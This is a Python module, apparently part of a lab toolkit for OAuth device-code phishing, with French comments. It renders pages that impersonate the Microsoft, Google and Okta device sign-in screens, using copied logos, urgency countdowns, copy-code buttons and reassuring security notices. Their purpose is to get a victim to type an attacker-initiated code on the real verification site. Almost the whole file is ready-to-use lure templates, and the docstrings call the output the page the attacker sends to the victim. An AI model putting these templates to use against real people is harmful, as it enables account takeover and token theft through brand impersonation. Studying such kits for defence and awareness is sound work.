"""
attack/device_code/victim_view.py — Page web victime
====================================================

La victime reçoit un email/Teams qui dit : "Pour finaliser la
configuration de votre compte, entrez ce code sur microsoft.com/devicelogin :
ABCD-EFGH". Cette page imite microsoft.com/devicelogin pour le labo.

Trois templates sont disponibles : microsoft, google, okta
"""

from __future__ import annotations

import html
from typing import Optional

from .initiator import DeviceCodeFlow


_MICROSOFT_LOGO_SVG = """<svg viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg" width="108" height="108">
  <rect x="0" y="0" width="50" height="50" fill="#F25022"/>
  <rect x="58" y="0" width="50" height="50" fill="#7FBA00"/>
  <rect x="0" y="58" width="50" height="50" fill="#00A4EF"/>
  <rect x="58" y="58" width="50" height="50" fill="#FFB900"/>
</svg>"""

_GOOGLE_LOGO_SVG = """<svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg" width="120" height="40">
  <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
  <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
  <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
  <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
  <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
  <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
</svg>"""

_OKTA_LOGO_SVG = """<svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" width="80" height="80">
  <path fill="#007DC1" d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256 256-114.6 256-256S397.4 0 256 0zm0 485.9c-126.8 0-229.9-103.1-229.9-229.9S129.2 26.1 256 26.1 485.9 129.2 485.9 256 382.8 485.9 256 485.9z"/>
  <path fill="#007DC1" d="M379.1 256L256 132.9 132.9 256 256 379.1 379.1 256zM256 181.3l74.7 74.7-74.7 74.7-74.7-74.7 74.7-74.7z"/>
</svg>"""


def _build_common_js(expires_at_iso: str, user_code: str) -> str:
    """JS commun: compte à rebours, auto-refresh 30s, formatage du temps."""
    return f"""
<script>
(function() {{
  var expiresAt = new Date("{html.escape(expires_at_iso).replace('Z', '').replace('"', '')}" + "Z").getTime();
  var userCode = "{html.escape(user_code)}";

  function pad(n) {{ return n < 10 ? "0" + n : "" + n; }}

  function updateCountdown() {{
    var now = Date.now();
    var diff = Math.max(0, expiresAt - now);
    var min = Math.floor(diff / 60000);
    var sec = Math.floor((diff % 60000) / 1000);
    var el = document.getElementById("countdown");
    if (el) {{
      el.textContent = pad(min) + ":" + pad(sec);
      if (diff < 60000) {{ el.style.color = "#d93025"; }}
    }}
    if (diff <= 0) {{
      var btn = document.getElementById("verify-btn");
      if (btn) {{ btn.disabled = true; btn.style.opacity = "0.5"; btn.style.cursor = "not-allowed"; }}
      var status = document.getElementById("expiry-status");
      if (status) {{ status.textContent = "EXPIRED"; status.style.color = "#d93025"; status.style.fontWeight = "bold"; }}
    }}
  }}

  function copyCode() {{
    try {{
      navigator.clipboard.writeText(userCode).then(function() {{
        var tip = document.getElementById("copy-tip");
        if (tip) {{ tip.textContent = "Copied!"; setTimeout(function() {{ tip.textContent = ""; }}, 2000); }}
      }});
    }} catch(e) {{}}
  }}

  updateCountdown();
  setInterval(updateCountdown, 1000);

  setTimeout(function() {{ location.reload(); }}, 30000);
}})();
</script>
"""


def _template_microsoft(flow: DeviceCodeFlow) -> str:
    """Template Microsoft — pixel-perfect style microsoft.com/devicelogin."""
    uc = html.escape(flow.user_code)
    vu = html.escape(flow.verification_uri, quote=True)
    vu_display = html.escape(flow.verification_uri)
    js = _build_common_js(flow.expires_at, flow.user_code)
    logo = _MICROSOFT_LOGO_SVG

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to your account</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{
      font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
      background: #f2f2f2;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }}
    .outer {{
      width: 100%;
      max-width: 440px;
    }}
    .card {{
      background: #ffffff;
      padding: 44px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
      border: 1px solid #e1e1e1;
    }}
    .logo {{ margin-bottom: 16px; display: flex; justify-content: flex-start; }}
    .title {{
      font-size: 24px;
      font-weight: 600;
      color: #1b1b1b;
      margin-bottom: 12px;
      line-height: 28px;
    }}
    .instruction {{
      font-size: 15px;
      color: #444;
      line-height: 20px;
      margin-bottom: 24px;
    }}
    .code-section {{ margin-bottom: 28px; }}
    .code-label {{
      font-size: 13px;
      color: #666;
      margin-bottom: 8px;
      font-weight: 600;
    }}
    .code-box {{
      position: relative;
      background: #fafafa;
      border: 1px solid #e1e1e1;
      padding: 18px 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-radius: 2px;
    }}
    .code {{
      font-family: "Consolas", "Courier New", monospace;
      font-size: 32px;
      font-weight: 600;
      letter-spacing: 2px;
      color: #1b1b1b;
    }}
    .copy-btn {{
      background: transparent;
      border: 1px solid #c8c6c4;
      color: #323130;
      padding: 6px 12px;
      font-size: 12px;
      cursor: pointer;
      border-radius: 2px;
      white-space: nowrap;
    }}
    .copy-btn:hover {{ background: #f3f2f1; border-color: #8a8886; }}
    .copy-tip {{ font-size: 11px; color: #107c10; height: 14px; margin-top: 4px; }}
    .uri-section {{ margin-bottom: 28px; }}
    .uri-label {{
      font-size: 13px;
      color: #666;
      margin-bottom: 8px;
      font-weight: 600;
    }}
    .uri-link {{
      font-size: 16px;
      color: #0078d4;
      text-decoration: none;
      word-break: break-all;
    }}
    .uri-link:hover {{ text-decoration: underline; }}
    .btn {{
      display: inline-block;
      width: 100%;
      background: #0078d4;
      color: #ffffff;
      border: none;
      padding: 10px 20px;
      font-size: 15px;
      font-weight: 600;
      text-align: center;
      text-decoration: none;
      cursor: pointer;
      border-radius: 2px;
      margin-top: 8px;
    }}
    .btn:hover {{ background: #106ebe; text-decoration: none; color: #fff; }}
    .expiry-box {{
      margin-top: 28px;
      padding: 12px;
      background: #fff4ce;
      border-left: 3px solid #fcd116;
      font-size: 12px;
      color: #555;
    }}
    .expiry-box strong {{ color: #1b1b1b; }}
    #countdown {{ font-family: "Consolas", monospace; font-size: 15px; color: #1b1b1b; font-weight: 600; }}
    .footer {{
      margin-top: 18px;
      text-align: center;
      font-size: 11px;
      color: #888;
    }}
    .footer a {{ color: #666; text-decoration: none; }}
  </style>
</head>
<body>
  <div class="outer">
    <div class="card">
      <div class="logo">{logo}</div>
      <div class="title">Activate your device</div>
      <div class="instruction">
        To finish signing in, enter this code on the <strong>verification page</strong> to confirm that you are the one trying to sign in.
      </div>
      <div class="code-section">
        <div class="code-label">Code</div>
        <div class="code-box">
          <span class="code">{uc}</span>
          <button class="copy-btn" onclick="copyCode()">Copy</button>
        </div>
        <div class="copy-tip" id="copy-tip"></div>
      </div>
      <div class="uri-section">
        <div class="uri-label">Go to this website</div>
        <a class="uri-link" href="{vu}" target="_blank" rel="noopener noreferrer">{vu_display}</a>
      </div>
      <a id="verify-btn" class="btn" href="{vu}" target="_blank" rel="noopener noreferrer">Verify on Microsoft</a>
      <div class="expiry-box">
        <strong>Time remaining:</strong> <span id="countdown">15:00</span>
        <span id="expiry-status" style="margin-left:8px;"></span>
        <div style="margin-top:6px;">If you didn't request this, someone else may be trying to access your account. Please ignore and contact your IT department.</div>
      </div>
    </div>
    <div class="footer">
      <a href="#">Terms of use</a> &nbsp;|&nbsp; <a href="#">Privacy &amp; cookies</a>
    </div>
  </div>
  {js}
</body>
</html>"""


def _template_google(flow: DeviceCodeFlow) -> str:
    """Template Google — style google.com/device."""
    uc = html.escape(flow.user_code)
    vu = html.escape(flow.verification_uri, quote=True)
    vu_display = html.escape(flow.verification_uri)
    js = _build_common_js(flow.expires_at, flow.user_code)
    logo = _GOOGLE_LOGO_SVG

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in with Google</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    html, body {{
      height: 100%;
      font-family: 'Google Sans', 'Noto Sans', 'Roboto', Arial, sans-serif;
      background: #fff;
      color: #202124;
      -webkit-font-smoothing: antialiased;
    }}
    body {{
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 48px 24px;
      min-height: 100vh;
    }}
    .card {{
      width: 100%;
      max-width: 450px;
    }}
    .logo {{
      display: flex;
      justify-content: center;
      margin-bottom: 32px;
    }}
    .title {{
      font-size: 24px;
      font-weight: 500;
      text-align: center;
      margin-bottom: 16px;
      color: #202124;
    }}
    .subtitle {{
      font-size: 16px;
      text-align: center;
      color: #5f6368;
      line-height: 1.5;
      margin-bottom: 32px;
    }}
    .code-card {{
      background: #f8f9fa;
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 32px 24px;
      text-align: center;
      margin-bottom: 24px;
    }}
    .code-label {{
      font-size: 13px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: #5f6368;
      margin-bottom: 12px;
      font-weight: 500;
    }}
    .code {{
      font-family: 'Roboto Mono', 'Consolas', monospace;
      font-size: 36px;
      font-weight: 500;
      color: #1a73e8;
      letter-spacing: 4px;
      padding: 12px 0;
      user-select: all;
      cursor: pointer;
    }}
    .copy-tip {{
      font-size: 12px;
      color: #188038;
      margin-top: 8px;
      height: 16px;
    }}
    .divider {{
      height: 1px;
      background: #dadce0;
      margin: 24px 0;
    }}
    .step-title {{
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 8px;
      font-weight: 500;
    }}
    .step-uri {{
      font-size: 18px;
      color: #1a73e8;
      text-decoration: none;
      word-break: break-all;
      display: block;
      margin-bottom: 4px;
    }}
    .step-uri:hover {{ text-decoration: underline; }}
    .step-hint {{
      font-size: 13px;
      color: #5f6368;
      margin-bottom: 24px;
    }}
    .btn {{
      display: inline-block;
      width: 100%;
      background: #1a73e8;
      color: #fff;
      border: none;
      padding: 12px 24px;
      border-radius: 4px;
      font-size: 15px;
      font-weight: 500;
      text-align: center;
      text-decoration: none;
      cursor: pointer;
      letter-spacing: 0.25px;
    }}
    .btn:hover {{ background: #1765cc; text-decoration: none; color: #fff; }}
    .countdown-box {{
      margin-top: 28px;
      padding: 16px;
      border-radius: 8px;
      background: #fef7e0;
      border: 1px solid #fdd663;
      text-align: center;
    }}
    .countdown-label {{
      font-size: 12px;
      color: #8a6b00;
      margin-bottom: 6px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }}
    #countdown {{
      font-family: 'Roboto Mono', monospace;
      font-size: 22px;
      font-weight: 500;
      color: #8a6b00;
    }}
    #expiry-status {{
      display: block;
      margin-top: 6px;
      font-size: 13px;
    }}
    .help {{
      margin-top: 24px;
      font-size: 12px;
      color: #5f6368;
      text-align: center;
      line-height: 1.6;
    }}
    .help a {{ color: #1a73e8; text-decoration: none; }}
    .help a:hover {{ text-decoration: underline; }}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">{logo}</div>
    <h1 class="title">Device sign-in</h1>
    <p class="subtitle">
      Use the code below to link your device to your Google Account securely.
    </p>
    <div class="code-card">
      <div class="code-label">Your activation code</div>
      <div class="code" onclick="copyCode()" title="Click to copy">{uc}</div>
      <div class="copy-tip" id="copy-tip">Click code to copy</div>
    </div>
    <div class="divider"></div>
    <div class="step-title">Step 1: Open the verification page</div>
    <a class="step-uri" href="{vu}" target="_blank" rel="noopener noreferrer">{vu_display}</a>
    <div class="step-hint">Link opens in a new tab or window.</div>
    <div class="step-title">Step 2: Enter the code when prompted</div>
    <a id="verify-btn" class="btn" href="{vu}" target="_blank" rel="noopener noreferrer">Continue to sign in</a>
    <div class="countdown-box">
      <div class="countdown-label">Code expires in</div>
      <span id="countdown">15:00</span>
      <span id="expiry-status"></span>
    </div>
    <p class="help">
      If you didn't ask for this code, don't enter it on any website.
      <a href="#">Learn more</a> about device sign-in.
    </p>
  </div>
  {js}
</body>
</html>"""


def _template_okta(flow: DeviceCodeFlow) -> str:
    """Template Okta — style okta.com activate."""
    uc = html.escape(flow.user_code)
    vu = html.escape(flow.verification_uri, quote=True)
    vu_display = html.escape(flow.verification_uri)
    js = _build_common_js(flow.expires_at, flow.user_code)
    logo = _OKTA_LOGO_SVG

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Okta Verify - Device Activation</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background: linear-gradient(135deg, #004175 0%, #007DC1 100%);
      min-height: 100vh;
      color: #1a1a1a;
      padding: 32px 16px;
    }}
    .container {{
      max-width: 480px;
      margin: 0 auto;
    }}
    .logo-bar {{
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px 0 32px;
    }}
    .logo-bar svg {{ margin-right: 12px; }}
    .logo-text {{
      color: #ffffff;
      font-size: 22px;
      font-weight: 600;
      letter-spacing: -0.3px;
    }}
    .card {{
      background: #ffffff;
      border-radius: 8px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
      padding: 40px 32px;
    }}
    .card-header {{
      text-align: center;
      margin-bottom: 28px;
    }}
    .header-icon {{
      width: 56px;
      height: 56px;
      margin: 0 auto 16px;
      background: #E8F3FC;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }}
    .header-icon svg {{ width: 28px; height: 28px; fill: #007DC1; }}
    .title {{
      font-size: 22px;
      font-weight: 600;
      color: #1a1a1a;
      margin-bottom: 8px;
    }}
    .subtitle {{
      font-size: 14px;
      color: #5c6370;
      line-height: 1.6;
    }}
    .code-panel {{
      background: #F7F9FC;
      border: 1px solid #E1E8EF;
      border-radius: 6px;
      padding: 24px 20px;
      margin-bottom: 24px;
    }}
    .code-label-row {{
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 10px;
    }}
    .code-label {{
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 1px;
      color: #5c6370;
      font-weight: 600;
    }}
    .copy-btn {{
      background: transparent;
      border: 1px solid #D0D7DE;
      color: #007DC1;
      padding: 4px 10px;
      font-size: 11px;
      border-radius: 4px;
      cursor: pointer;
      font-weight: 500;
    }}
    .copy-btn:hover {{ background: #E8F3FC; border-color: #007DC1; }}
    .code-display {{
      font-family: "SF Mono", "Roboto Mono", Consolas, monospace;
      font-size: 30px;
      font-weight: 600;
      color: #004175;
      letter-spacing: 5px;
      text-align: center;
      padding: 14px 0;
      background: #fff;
      border: 1px dashed #B6C2CF;
      border-radius: 4px;
      user-select: all;
    }}
    .copy-tip {{
      text-align: center;
      font-size: 11px;
      color: #0a7f3f;
      margin-top: 8px;
      height: 14px;
      font-weight: 500;
    }}
    .steps {{
      margin-bottom: 24px;
    }}
    .step {{
      display: flex;
      margin-bottom: 16px;
      align-items: flex-start;
    }}
    .step-num {{
      width: 24px;
      height: 24px;
      border-radius: 50%;
      background: #007DC1;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      font-weight: 600;
      flex-shrink: 0;
      margin-right: 12px;
    }}
    .step-body {{ flex: 1; }}
    .step-title {{
      font-size: 14px;
      font-weight: 600;
      color: #1a1a1a;
      margin-bottom: 2px;
    }}
    .step-desc {{
      font-size: 13px;
      color: #5c6370;
      line-height: 1.5;
    }}
    .step-link {{
      color: #007DC1;
      text-decoration: none;
      font-weight: 500;
    }}
    .step-link:hover {{ text-decoration: underline; }}
    .primary-btn {{
      display: block;
      width: 100%;
      background: #007DC1;
      color: #fff;
      border: none;
      padding: 14px 20px;
      font-size: 15px;
      font-weight: 600;
      border-radius: 6px;
      text-align: center;
      text-decoration: none;
      cursor: pointer;
      transition: background 0.15s ease;
    }}
    .primary-btn:hover {{ background: #0069a3; color: #fff; text-decoration: none; }}
    .countdown {{
      margin-top: 24px;
      padding: 14px 16px;
      border-radius: 6px;
      background: #FFF8E6;
      border-left: 3px solid #EFB62C;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 13px;
    }}
    .countdown-text {{ color: #7A5A00; }}
    #countdown {{
      font-family: "SF Mono", Consolas, monospace;
      font-weight: 600;
      color: #7A5A00;
      font-size: 15px;
    }}
    #expiry-status {{
      font-size: 11px;
      display: block;
      text-align: right;
      margin-top: 4px;
    }}
    .footer-note {{
      margin-top: 28px;
      padding: 16px;
      background: #F5222D10;
      border-left: 3px solid #F5222D;
      border-radius: 4px;
      font-size: 12px;
      color: #5c6370;
      line-height: 1.6;
    }}
    .footer-note strong {{ color: #A8071A; }}
    .page-footer {{
      margin-top: 28px;
      text-align: center;
      color: rgba(255,255,255,0.75);
      font-size: 12px;
    }}
    .page-footer a {{ color: rgba(255,255,255,0.9); text-decoration: none; }}
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-bar">
      {logo}
      <span class="logo-text">Okta Identity Cloud</span>
    </div>
    <div class="card">
      <div class="card-header">
        <div class="header-icon">
          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
        </div>
        <div class="title">Secure Device Activation</div>
        <div class="subtitle">Complete multi-factor authentication to activate your session.</div>
      </div>
      <div class="code-panel">
        <div class="code-label-row">
          <span class="code-label">Activation Code</span>
          <button class="copy-btn" onclick="copyCode()">Copy code</button>
        </div>
        <div class="code-display">{uc}</div>
        <div class="copy-tip" id="copy-tip"></div>
      </div>
      <div class="steps">
        <div class="step">
          <div class="step-num">1</div>
          <div class="step-body">
            <div class="step-title">Navigate to activation portal</div>
            <div class="step-desc">
              Open <a class="step-link" href="{vu}" target="_blank" rel="noopener noreferrer">{vu_display}</a>
            </div>
          </div>
        </div>
        <div class="step">
          <div class="step-num">2</div>
          <div class="step-body">
            <div class="step-title">Sign in with your credentials</div>
            <div class="step-desc">Use your Okta username and password.</div>
          </div>
        </div>
        <div class="step">
          <div class="step-num">3</div>
          <div class="step-body">
            <div class="step-title">Enter the activation code</div>
            <div class="step-desc">Paste or type the code above when prompted.</div>
          </div>
        </div>
      </div>
      <a id="verify-btn" class="primary-btn" href="{vu}" target="_blank" rel="noopener noreferrer">Open Okta Verification</a>
      <div class="countdown">
        <span class="countdown-text">Valid for:</span>
        <div>
          <span id="countdown">15:00</span>
          <span id="expiry-status"></span>
        </div>
      </div>
      <div class="footer-note">
        <strong>Security notice:</strong> Only enter this code if you initiated the request.
        Okta Support will never ask you for a device code. Report suspicious activity to your security team.
      </div>
    </div>
    <div class="page-footer">
      © Okta, Inc. &nbsp;|&nbsp; <a href="#">Privacy</a> &nbsp;|&nbsp; <a href="#">Trust</a>
    </div>
  </div>
  {js}
</body>
</html>"""


_TEMPLATES = {
    "microsoft": _template_microsoft,
    "google": _template_google,
    "okta": _template_okta,
}


def generate_victim_page(flow: DeviceCodeFlow, template: str = "microsoft") -> str:
    """
    Génère la page HTML que l'attaquant envoie à la victime.

    Args:
        flow: Flow DeviceCodeFlow contenant user_code, verification_uri, expires_at
        template: Un parmi "microsoft", "google", "okta"

    Returns:
        str HTML avec SVG logo, user_code en grand, lien cliquable,
        compte à rebours dynamique et auto-refresh 30s.
    """
    tpl = _TEMPLATES.get(template.lower())
    if tpl is None:
        available = ", ".join(sorted(_TEMPLATES.keys()))
        raise ValueError(
            f"Template '{template}' inconnu. Disponibles: {available}"
        )
    return tpl(flow)


def get_victim_page_html(
    user_code: str,
    verification_uri: str = "https://microsoft.com/devicelogin",
    message: str = "Pour finaliser l'activation de votre compte, entrez le code ci-dessous sur le site officiel de Microsoft :",
) -> str:
    """
    Helper rétro-compatible. Préférez `generate_victim_page()` qui prend
    un DeviceCodeFlow et gère 3 templates avec compte à rebours dynamique.
    """
    from .initiator import DeviceCodeFlow
    from datetime import datetime, timedelta
    import secrets

    flow = DeviceCodeFlow(
        flow_id=secrets.token_hex(4),
        client_id="00000000-0000-0000-0000-000000000000",
        scope="User.Read",
        device_code=secrets.token_urlsafe(32),
        user_code=user_code,
        verification_uri=verification_uri,
        expires_at=(datetime.utcnow() + timedelta(minutes=15)).isoformat() + "Z",
        interval=5,
        victim_message=message,
    )
    return generate_victim_page(flow, template="microsoft")


def render_victim_page(
    user_code: str,
    verification_uri: str = "https://microsoft.com/devicelogin",
) -> str:
    """Alias pour `get_victim_page_html`."""
    return get_victim_page_html(user_code, verification_uri)
